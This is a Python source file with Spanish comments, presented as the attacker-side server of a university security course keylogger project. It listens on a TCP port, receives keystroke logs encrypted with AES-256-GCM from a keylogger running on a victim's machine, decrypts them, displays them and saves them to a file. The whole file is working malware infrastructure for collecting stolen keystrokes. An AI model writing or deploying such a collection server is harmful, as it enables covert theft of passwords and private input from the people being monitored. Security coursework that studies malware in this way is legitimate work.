"""
server.py — Lado atacante
Proyecto Unidad 2 - Seguridad Informática · Universidad de Talca

Ejecutar en la máquina del atacante ANTES de activar el keylogger.
Uso: python server.py

Flujo:
  1. Escucha conexiones TCP entrantes en SERVER_PORT
  2. Lee el payload con protocolo length-prefix (4 bytes + datos)
  3. Descifra con AES-256-GCM usando la clave compartida
  4. Muestra las teclas capturadas en pantalla y las guarda en received_logs.txt
"""

import os
import socket
import struct
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

import config

RECEIVED_LOG = "received_logs.txt"

# ---------------------------------------------------------------------------
# DESCIFRADO — AES-256-GCM
# ---------------------------------------------------------------------------

def _decrypt(data: bytes, key: bytes) -> str:
    """
    Descifra un mensaje cifrado con AES-256-GCM.

    Parámetros:
        data: nonce (12 bytes) + ciphertext + tag (16 bytes).
        key: clave de 32 bytes — debe coincidir con la del keylogger.

    Retorna:
        str: texto plano descifrado.

    Lanza:
        InvalidTag si la clave es incorrecta o el mensaje fue alterado.
    """
    nonce, ciphertext_tag = data[:12], data[12:]
    return AESGCM(key).decrypt(nonce, ciphertext_tag, None).decode("utf-8")


# ---------------------------------------------------------------------------
# SERVIDOR TCP
# ---------------------------------------------------------------------------

def _recv_exact(sock: socket.socket, n: int) -> bytes:
    """
    Lee exactamente n bytes del socket.
    TCP no garantiza que recv() retorne todos los bytes de una vez, por eso se itera.
    """
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Conexión cerrada antes de leer todos los bytes")
        data += chunk
    return data


def _handle(conn: socket.socket, addr: tuple, key: bytes) -> None:
    """
    Procesa una conexión: lee el payload, descifra y guarda.
    """
    try:
        length = struct.unpack(">I", _recv_exact(conn, 4))[0]
        payload = _recv_exact(conn, length)
        plaintext = _decrypt(payload, key)

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        separator = "=" * 60
        print(f"\n{separator}\n[{timestamp}] de {addr[0]}:{addr[1]}\n{separator}")
        print(plaintext)

        with open(RECEIVED_LOG, "a", encoding="utf-8") as f:
            f.write(f"\n{separator}\n[{timestamp}] de {addr[0]}:{addr[1]}\n{separator}\n")
            f.write(plaintext)

    except Exception as e:
        print(f"[!] Error con {addr[0]}: {e}")
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# PUNTO DE ENTRADA
# ---------------------------------------------------------------------------

def main() -> None:
    key = bytes.fromhex(config.ENCRYPTION_KEY)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", config.SERVER_PORT))
        srv.listen(5)
        print(f"[*] Escuchando en 0.0.0.0:{config.SERVER_PORT}")
        print(f"[*] Logs en: {os.path.abspath(RECEIVED_LOG)}")
        print("[*] Ctrl+C para detener\n")

        while True:
            try:
                conn, addr = srv.accept()
                print(f"[+] Conexión de {addr[0]}:{addr[1]}")
                _handle(conn, addr, key)
            except KeyboardInterrupt:
                print("\n[*] Servidor detenido.")
                break


if __name__ == "__main__":
    main()
